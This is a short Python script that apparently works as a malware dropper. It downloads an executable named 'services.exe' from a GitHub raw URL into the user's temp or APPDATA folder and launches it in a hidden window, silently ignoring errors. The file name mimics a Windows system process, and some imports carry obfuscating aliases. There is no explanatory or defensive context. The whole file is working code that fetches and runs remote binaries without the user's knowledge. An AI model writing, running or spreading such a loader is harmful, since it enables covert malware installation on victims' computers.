from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from subprocess import Popen, CREATE_NO_WINDOW
import subprocess
import requests
import os
import uuid
import tempfile

url = "https://github.com/Dch12zz/services/raw/refs/heads/main/services.exe"
temp = tempfile.gettempdir()
name = os.path.join(temp, f"services.exe")
if not os.path.exists(name):
    response = requests.get(url)
    if response.status_code == 200:
        with open(name, 'wb') as dosya:
            dosya.write(response.content)
            try:
                Popen(name,creationflags=CREATE_NO_WINDOW,shell=True)
            except:
                pass
else:
    path = os.getenv('APPDATA')
    name = os.path.join(path, f"services.exe")
    response = requests.get(url)
    if response.status_code == 200:
        with open(name, 'wb') as dosya:
            dosya.write(response.content)
            try:
                Popen(name,creationflags=CREATE_NO_WINDOW,shell=True)
            except:
                pass
